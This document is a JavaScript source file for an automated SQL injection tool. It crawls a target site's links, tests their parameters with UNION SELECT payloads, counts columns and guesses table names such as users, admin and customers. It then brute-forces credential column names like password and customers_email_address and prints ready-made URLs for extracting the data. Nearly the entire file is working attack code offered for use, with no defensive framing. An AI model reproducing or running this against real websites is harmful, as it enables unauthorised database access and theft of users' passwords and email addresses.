function sqlcheck(url)
{
 var par2 = url.split("=");
 par2.pop();
 var newurl = par2.join("=")+"=";
 var par = con(newurl+"-1%20and%201=1%20union%20select%200--");
 if(par.indexOf("number of columns") != -1)
 {
  return 1;
 }else{
  return 0;
 }
}
function deepscan(url)
{
 var t = setTimeout(showMesa('Working....'), 1);
 var count = colcount(url);
 if(count == 1)
 {
  showMes("No SQL injection found");
  return;
 }else{
  showMes("Injection found");
 }
 var tables = findtable(url);
 if(tables.length == 0)
 {
  showMes("Number of columns: "+count+"<BR>No table names found.");
  return;
 }
 var colnames = getcolnames(count, tables, url);
 if(colnames != "")
 {
  var out = "You can extract data using these urls:<BR>";
  for(names in colnames)
  {
   out += '<a href="'+colnames[names]+'" target="about.html">'+colnames[names]+'</a><BR>';
  }
  showMes(out);
  //showMes(url);
 }else{
  var out = "Injection found!<BR>";
  out += "Number of columns: "+count+"<BR>";
  out += "Table names:<BR>";
  var tablename = "";
  for(names in tables)
  {
   out += tables[names]+"<BR>";
   tablename = tables[names];
  }
  out += "I could not get any column names, this does not mean that you can do it by hand however. This may infact just be due to some wierd encoding issue.<BR><BR>You can start with this address:<BR>";
  var i = 0;
  var colstr = "";
  while(i != count)
  {
   if(colstr == "")
   {
    colstr += i;
   }else{
    colstr += ","+i;
   }
   i++;
  }
  var parurl = url.split("=");
  parurl.pop();
  var parurl2 = parurl.join("=");
  var rawurl = parurl2+"=-1%20union%20select%20"+colstr+"%20from%20"+tablename+"--";
  out += '<a href="'+rawurl+'" target="about.html">'+rawurl+'</a>';
  showMes(out);
 }
}
function sqlscan()
{
 try{
  var url = document.getElementById("target").value;
  var t = setTimeout(showMesa('Working....'), 1);
  //var t=setTimeout("showMes('Working....')", 0);
  //var t=setTimeout(function(){document.getElementById("data").innerHTML='Working...';}), 1);
  var data = con(url);
  var links = linklist(data, url);
  links.push(url);
  var open = Array();
  var urls = Array();
  for(link in links)
  {
   if(links[link].indexOf("=") != -1)
   {
    if(links[link].indexOf("&") != -1)
    {
     var par = links[link].split("&");
     var len = par.length;
     var i = 0;
     while(i != len)
     {
      var raw = par.join("&");
      var raw2 = sqlcheck(raw);
      par.pop();
      if(raw2 == 1)
      {
       open.push(raw);
      }
      i++;
     }
    }else{
     var raw = links[link];
     var raw2 = sqlcheck(raw);
     if(raw2 == 1)
     {
      open.push(raw);
     }
    }
   }
  }
  if(open != "")
  {
   var out = "These links are open to SQLi<br>";
   for(line in open)
   {
    out += open[line]+'<button onClick="deepscan(\''+open[line]+'\')">Deep scan</button><BR>';
   }
   showMes(out);
  }else{
   showMes("No injections found.");
  }
 }catch(e){
  showMes(e);
 }
}
function getcolnames(count, tables, url)
{
 //code
 //return url;
 var parurl = url.split("=");
 parurl.pop();
 if(parurl.length == 1)
 {
 url = parurl[0];
 }else{
  url = parurl.join("=");
 }
 var i = 0;
 var col_names = Array('pass', 'passwd', 'password', 'user_pass', 'user_email', 'user_mail', 'email', 'mail', 'user', 'name', 'username', 'user_name', 'customers_password', 'customers_email_address', 'customer_password', 'customer_email_address', 'customers_email', 'customer_email', 'user_passwd', 'user_password', 'user_id', 'id', 'uid');
 var colstr = "";
 var out = Array();
 while(i != count)
 {
  if(colstr == "")
  {
   colstr += i+"91"+i;
  }else{
   colstr += ","+i+"91"+i;
  }
  i++;
 }
 for(table in tables)
 {
  var rawurl = url+"=-1%20and%201=1%20union%20select%20"+colstr+"%20from%20"+tables[table]+"--";
  //out.push(rawurl);
  var data = con(rawurl);
  var cols = colstr.split(",");
  var datacol = Array(tables[table]);
  for(col in cols)
  {
   if(data.indexOf(cols[col]) != -1)
   {
    for(colname in col_names) 
    {
     var par = rawurl.replace(cols[col], col_names[colname])
     var pardata = con(par);
     if(pardata.indexOf("Unknown column") == -1)
     {
      out.push(par);
     }
    }
    break;
   }
  }
  //out.push(datacol)
 }
 return out;
}
function findtable(url)
{
 try{
 //code
 var newurl = url+"-1%20and%201=1%20union%20select%200%20from%20";
 var table = Array();
 var names = Array('asd123', 'members', 'member', 'users', 'user', 'customers', 'customer', 'admin', 'accounts', 'account', 'administrators', 'staff', 'administrator', 't_core_module');
 for(sname in names){
  var rawurl = newurl+""+names[sname]+"--";
  var data = con(rawurl);
  data.toLowerCase();
  if(data.indexOf(names[sname]) == -1)
  {
   table.push(names[sname]);
  }
 }
 return table;
 }catch(e){
  return e;
 }
}
function colcount(url)
{
 try{
 //code
 var newurl = url+"-1%20and%201=1%20union%20select%20";
 var col = 0;
 var cols = "";
 while(1==1)
 {
  if(col == 30)
  {
   return 1;
   break;
  }
  if(cols == "")
  {
   cols += col;
  }else{
   cols += ","+col;
  }
  var purl = newurl+""+cols+"--";
  var data = con(purl);
  if(data.indexOf("number of columns") == -1)
  {
   col++;
   return col;
   break;
  }
  col++;
  }
 }catch(e){
   return "err";
 }
}
